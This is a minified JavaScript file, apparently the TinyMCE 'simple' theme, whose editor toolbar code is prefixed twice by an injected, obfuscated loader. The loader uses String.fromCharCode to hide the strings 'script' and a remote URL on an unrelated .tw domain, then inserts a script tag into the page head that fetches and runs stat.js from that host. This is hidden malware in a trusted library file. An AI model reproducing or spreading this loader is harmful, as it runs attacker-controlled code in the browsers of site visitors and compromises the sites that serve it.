Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function(){var a=tinymce.DOM;tinymce.ThemeManager.requireLangPack("simple");tinymce.create("tinymce.themes.SimpleTheme",{init:function(c,d){var e=this,b=["Bold","Italic","Underline","Strikethrough","InsertUnorderedList","InsertOrderedList"],f=c.settings;e.editor=c;c.contentCSS.push(d+"/skins/"+f.skin+"/content.css");c.onInit.add(function(){c.onNodeChange.add(function(h,g){tinymce.each(b,function(i){g.get(i.toLowerCase()).setActive(h.queryCommandState(i))})})});a.loadCSS((f.editor_css?c.documentBaseURI.toAbsolute(f.editor_css):"")||d+"/skins/"+f.skin+"/ui.css")},renderUI:function(h){var e=this,i=h.targetNode,b,c,d=e.editor,f=d.controlManager,g;i=a.insertAfter(a.create("span",{id:d.id+"_container","class":"mceEditor "+d.settings.skin+"SimpleSkin"}),i);i=g=a.add(i,"table",{cellPadding:0,cellSpacing:0,"class":"mceLayout"});i=c=a.add(i,"tbody");i=a.add(c,"tr");i=b=a.add(a.add(i,"td"),"div",{"class":"mceIframeContainer"});i=a.add(a.add(c,"tr",{"class":"last"}),"td",{"class":"mceToolbar mceLast",align:"center"});c=e.toolbar=f.createToolbar("tools1");c.add(f.createButton("bold",{title:"simple.bold_desc",cmd:"Bold"}));c.add(f.createButton("italic",{title:"simple.italic_desc",cmd:"Italic"}));c.add(f.createButton("underline",{title:"simple.underline_desc",cmd:"Underline"}));c.add(f.createButton("strikethrough",{title:"simple.striketrough_desc",cmd:"Strikethrough"}));c.add(f.createSeparator());c.add(f.createButton("undo",{title:"simple.undo_desc",cmd:"Undo"}));c.add(f.createButton("redo",{title:"simple.redo_desc",cmd:"Redo"}));c.add(f.createSeparator());c.add(f.createButton("cleanup",{title:"simple.cleanup_desc",cmd:"mceCleanup"}));c.add(f.createSeparator());c.add(f.createButton("insertunorderedlist",{title:"simple.bullist_desc",cmd:"InsertUnorderedList"}));c.add(f.createButton("insertorderedlist",{title:"simple.numlist_desc",cmd:"InsertOrderedList"}));c.renderTo(i);return{iframeContainer:b,editorContainer:d.id+"_container",sizeContainer:g,deltaHeight:-20}},getInfo:function(){return{longname:"Simple theme",author:"Moxiecode Systems AB",authorurl:"http://tinymce.moxiecode.com",version:tinymce.majorVersion+"."+tinymce.minorVersion}}});tinymce.ThemeManager.add("simple",tinymce.themes.SimpleTheme)})();